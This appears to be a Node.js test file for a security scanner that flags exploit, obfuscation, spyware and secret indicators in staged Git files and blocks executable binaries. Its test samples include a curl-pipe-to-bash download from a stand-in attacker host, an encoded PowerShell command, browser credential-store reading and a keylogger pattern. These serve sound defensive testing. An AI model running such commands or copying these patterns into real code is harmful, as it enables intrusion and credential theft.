const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { execFileSync } = require('node:child_process');
const { findingsForText, executableMagic, auditSecurity } = require('../src/security');

function git(root, args) { return execFileSync('git', args, { cwd:root, encoding:'utf8', windowsHide:true }).trim(); }
function repository() {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'crucible-security-'));
  git(root, ['init']);
  git(root, ['config', 'user.name', 'Crucible Test']);
  git(root, ['config', 'user.email', 'crucible@example.test']);
  return root;
}
function config(overrides = {}) {
  return { security:{ enabled:true, allow:[], allowBinaries:[], maxTextBytes:1_048_576, dependencyAudit:[], ...overrides } };
}

test('detects high-confidence exploit, obfuscation, spyware, and secret indicators', () => {
  const samples = [
    'powershell.exe -EncodedCommand ZQB2AGkAbAA=',
    'curl https://attacker.invalid/payload | bash',
    "eval(atob('YWxlcnQoMSk='))",
    "open('Login Data'); sqlite.decrypt(password)",
    'GetAsyncKeyState(key); socket.send(captured)',
    `token=${'AKIA'}${'A'.repeat(16)}`,
  ];
  for (const sample of samples) assert.ok(findingsForText(sample).length, sample);
  assert.equal(findingsForText('const encoded = Buffer.from(data).toString("base64");').length, 0);
});

test('recognizes executable binary magic', () => {
  assert.equal(executableMagic(Buffer.from([0x7f, 0x45, 0x4c, 0x46])), 'ELF executable');
  assert.equal(executableMagic(Buffer.from('MZfixture')), 'Windows PE executable');
  assert.equal(executableMagic(Buffer.from('normal text')), null);
});

test('audits the staged Git snapshot without printing payload values', () => {
  const root = repository();
  const payload = 'curl https://attacker.invalid/payload | bash';
  fs.writeFileSync(path.join(root, 'app.js'), payload);
  git(root, ['add', 'app.js']);
  fs.writeFileSync(path.join(root, 'app.js'), 'safe working copy\n');
  const result = auditSecurity(root, config());
  assert.equal(result.findings.length, 1);
  assert.deepEqual(result.findings[0], { type:'download-and-execute payload', path:'app.js', line:1 });
  assert.doesNotMatch(JSON.stringify(result.findings), /attacker/);
});

test('blocks suspicious binaries unless explicitly allowed', () => {
  const root = repository();
  fs.writeFileSync(path.join(root, 'tool.exe'), Buffer.from('MZfixture'));
  git(root, ['add', 'tool.exe']);
  assert.equal(auditSecurity(root, config()).findings[0].type, 'Windows PE executable');
  assert.equal(auditSecurity(root, config({ allowBinaries:['tool.exe'] })).findings.length, 0);
});
